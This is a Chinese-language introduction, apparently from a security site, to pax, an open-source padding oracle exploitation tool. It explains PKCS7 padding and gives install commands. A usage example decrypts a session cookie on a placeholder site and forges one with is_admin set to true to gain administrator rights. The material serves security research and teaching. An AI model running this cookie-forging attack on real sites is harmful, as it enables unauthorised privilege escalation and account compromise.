![](https://image.3001.net/images/20220926/1664164101_63312105580181b7cd0f2.png!small)

## 关于pax

pax是一款针对PKCS7 Padding Oracle攻击的强大安全研究工具，在该工具的帮助下，广大研究人员可以更好地学习、理解和利用Padding
Oracle漏洞，并设计出更完善的漏洞检测方案或安全解决方案。

pax全名为PAdding oracle eXploiter，该工具支持下列功能：

> 1、获取给定的CBC加密数据解密后对应的明文信息；
>
> 2、通过Oracle使用的未知加密算法，获取给定明文片段对应的加密字节数据；

我们可以使用该工具获取和查看公开加密的会话信息，然后通过加密自定义明文并将其写回给服务器来绕过身份认真机制、实现权限提升以及远程代码执行。

## 关于Padding Oracle

Padding的含义是“填充”，在解密时，如果算法发现解密后得到的结果，它的填充方式不符合规则，那么表示输入数据有问题，对于解密的类库来说，往往便会抛出一个异常，提示Padding不正确。Oracle在这里便是“提示”的意思，和甲骨文公司没有任何关系。

对于加密算法来说，它们是基于等长的“数据块”进行操作的（如对于RC2，DES或TripleDES算法来说这个长度是8字节，而对于Rijndael算法来说则是16、24或32字节）。但是，我们的输入数据长度是不规则的，因此必然需要进行“填充”才能形成完整的“块”。本工具针对的“填充”是PKCS
#7规则，简单地说，便是根据最后一个数据块所缺少的长度来选择填充的内容。

## 工具下载

### 源码下载

广大研究人员可以直接访问该项目的【[
_Releases页面_](https://github.com/liamg/pax/releases)】下载工具源码，或者使用下列命令直接将该项目源码克隆至本地：

    
    
    git clone https://github.com/liamg/pax.git

### Go安装

下列命令可以使用Go来安装pax：

    
    
    go get -u github.com/liamg/pax/cmd/pax

## 工具使用样例

如果你发现了一个可疑的oracle，其中将加密数据存储在了一个名为“SESS”的Cookie中，那么你就可以执行下列命令：

    
    
    pax decrypt --url https://target.site/profile.php --sample Gw3kg8e3ej4ai9wffn%2Fd0uRqKzyaPfM2UFq%2F8dWmoW4wnyKZhx07Bg%3D%3D --block-size 16 --cookies "SESS=Gw3kg8e3ej4ai9wffn%2Fd0uRqKzyaPfM2UFq%2F8dWmoW4wnyKZhx07Bg%3D%3D"

上述命令将给你返回某些明文信息，大致如下：

    
    
    {"user_id": 456, "is_admin": false}

在这里，我们就可以实现权限提升了。

为了实现提权，我们可以尝试通过生成我们自己的加密数据，然后oracle将负责进行解密并回传某些明文数据：

    
    
    pax encrypt --url https://target.site/profile.php --sample Gw3kg8e3ej4ai9wffn%2Fd0uRqKzyaPfM2UFq%2F8dWmoW4wnyKZhx07Bg%3D%3D --block-size 16 --cookies "SESS=Gw3kg8e3ej4ai9wffn%2Fd0uRqKzyaPfM2UFq%2F8dWmoW4wnyKZhx07Bg%3D%3D" --plain-text '{"user_id": 456, "is_admin": true}'

上述命令将产生另一个Base64编码的加密数据，大致如下：

    
    
    dGhpcyBpcyBqdXN0IGFuIGV4YW1wbGU=

现在，我们就可以打开浏览器，然后将名为“SESS”的Cookie设置为上述值，在加载了原始oracle页面之后，你将会看到你已经提权到了管理员权限。

## 项目地址

本项目的开发与发布遵循[ _MIT_](https://github.com/liamg/pax/blob/master/LICENSE)开源许可证协议。

## 项目地址

 **pax** ：【[ _GitHub传送门_](https://github.com/liamg/pax)】

## 参考资料

> [ _https://robertheaton.com/2013/07/29/padding-oracle-> attack/_](https://robertheaton.com/2013/07/29/padding-oracle-attack/)
>
> [ _https://blog.skullsecurity.org/2013/padding-oracle-attacks-in-> depth_](https://blog.skullsecurity.org/2013/padding-oracle-attacks-in-depth)

